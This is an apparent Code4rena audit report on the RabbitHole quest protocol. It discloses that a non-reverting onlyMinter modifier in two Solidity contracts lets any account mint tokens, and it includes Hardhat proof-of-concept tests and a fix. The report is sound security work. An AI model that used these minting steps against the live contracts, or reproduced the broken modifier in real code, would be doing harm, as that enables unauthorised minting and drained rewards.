# Original link
https://github.com/code-423n4/2023-01-rabbithole-findings/issues/106
# Lines of code

https://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/RabbitHoleReceipt.sol#L58-L61
https://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/RabbitHoleTickets.sol#L47-L50


# Vulnerability details

## Impact
The `RabbitHoleTickets` and `RabbitHoleReceipt` contracts contain an `onlyMinter` modifier which intends to restrict the access to token minting functions to privileged accounts only.

However the implementation of the  `onlyMinter` modifier is incorrect.
```solidity
    modifier onlyMinter() {
        msg.sender == minterAddress;
        _;
    }
```
The modifier does not revert the transaction when the required condition is `falsy`. As a result any account can mint any amount of tokens to any ethereum account.

#### Actual Impact
As `RabbitHoleTickets` and `RabbitHoleReceipt` are valuable tokens to the protocol, unrestrictive minting of these tokens can cause severe financial loss to the protocol and its users. The `RabbitHoleReceipt` tokens can be used to drain rewards  from `Quest` contracts.

## Proof of Concept
The below mentioned test cases were added to `./test/RabbitHoleReceipt.spec.ts ` file and ran using `npx hardhat test ./test/RabbitHoleReceipt.spec.ts ` command.
```typescript
  describe.only('RabbitHoleReceipt Bug', () => {
    it('any account can mint tokens', async () => {
      const randomUser = (await ethers.getSigners())[10];
      const questId = 'abc';

      // Initial balance is 0
      expect(await RHReceipt.balanceOf(randomUser.address)).to.equal(0)

      // Mint via randomUser
      await RHReceipt.mint(randomUser.address, questId)

      // Tokens minted
      expect(await RHReceipt.balanceOf(randomUser.address)).to.equal(1)
    })
  })
```

The below mentioned test cases were added to `./test/RabbitHoleTickets.spec.ts ` file and ran using `npx hardhat test ./test/RabbitHoleTickets.spec.ts ` command.
```typescript
  describe.only('RabbitholeTickets Bug', () => {
    it('any account can mint tokens', async () => {
      const randomUser = (await ethers.getSigners())[10];
      const tokenId = 100;

      // Initial balance is 0
      expect(await RHTickets.balanceOf(randomUser.address, tokenId)).to.equal(0)

      // Mint via randomUser
      await RHTickets.mint(randomUser.address, tokenId, 10, '0x00')

      // Tokens minted
      expect(await RHTickets.balanceOf(randomUser.address, tokenId)).to.equal(10)
    })
  })
```

## Tools Used
Hardhat

## Recommended Mitigation Steps
Consider reverting on falsy result for the condition in the `onlyMinter` modifiers.
```solidity
    modifier onlyMinter() {
        require(msg.sender == minterAddress, "not minter");
        _;
    }
```